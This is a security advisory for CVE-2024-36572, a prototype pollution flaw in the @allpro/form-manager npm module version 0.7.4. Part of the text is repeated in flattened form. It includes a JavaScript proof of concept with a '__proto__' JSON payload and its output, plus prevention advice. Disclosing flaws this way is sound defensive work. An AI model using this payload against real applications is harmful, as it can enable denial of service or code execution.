[CVE-2024-36572] Prototype pollution vulnerability affecting @allpro/form-manager NPM module, version 0.7.4

 [Raw](/mestrtee/1771ab4fba733ca898b6e2463dc6ed19/raw/54669601bc55e0677b17f46adf5cdf423640d6ec/CVE-2024-36572.md)

[**CVE-2024-36572.md**](#file-cve-2024-36572-md)

## Overview

The module is vulenrable via `setDefaults (form-manager/cjs/index.js:1299)`, `mergeBranch (form-manager/cjs/index.js:1249)`, and `Object.setObjectValue (form-manager/cjs/index.js:1536)`. In all these implementations, the assignment of the property from source to destination occurred without proper protection.
An attacker can be exploit this method to copy malicious property to the built-in Object.prototype through the special properties `__proto__` or `constructor.prototype`.
Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service,
remote code execution or cross-site scripting attacks.

## PoC:

```
(async () => {
  const lib = await import('@allpro/form-manager');
var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}');
var victim = {}
console.log("Before Attack: ", JSON.stringify(victim.__proto__));
try {
// uncomment one at a time
  lib.default.defaultsDeep ({}, BAD_JSON)
  //lib.default.merge ({}, BAD_JSON)
  //lib.default.setObjectValue ({}, "__proto__.polluted", true)
} catch (e) { }
console.log("After Attack: ", JSON.stringify(victim.__proto__));
delete Object.prototype.polluted;
})();

```

Output:

```
Before Attack:  {}
After Attack:  {"polluted":true}
```

Output of a successful fix:

```
Before Attack:  {}
After Attack:  {}
```

## How to prevent:

No updates were provided by the maintainer. Users of this module are urged to implement proper santization and validation over user's supplied inputs, such as blocking inputs containing `__proto__` and `contructor.prototype`

| Overview The module is vulenrable via three functions: , located at `setDefaults (form-manager/cjs/index.js:1299)`, `mergeBranch (form-manager/cjs/index.js:1249)`, and `Object.setObjectValue (form-manager/cjs/index.js:1536)` respectively.

Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service, remote code execution or cross-site scripting attacks. PoC: ``` (async () => {   const lib = await import('@allpro/form-manager'); var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}'); var victim = {} console.log("Before Attack: ", JSON.stringify(victim.__proto__)); try { // uncomment one at a time   lib.default.defaultsDeep ({}, BAD_JSON)   //lib.default.merge ({}, BAD_JSON)   //lib.default.setObjectValue ({}, "__proto__.polluted", true) } catch (e) { } console.log("After Attack: ", JSON.stringify(victim.__proto__)); delete Object.prototype.polluted; })();  ```  Output:  ``` Before Attack:  {} After Attack:  {"polluted":true} ```  Output of a successful fix:  ``` Before Attack:  {} After Attack:  {} ``` How to prevent: Assign or copy a property should only be applied an own property of the destination object, thus, check for that (e.g using hasOwnProperty) is sufficient. Alternatively, block the property names `__proto__` or `constructor` assigned.
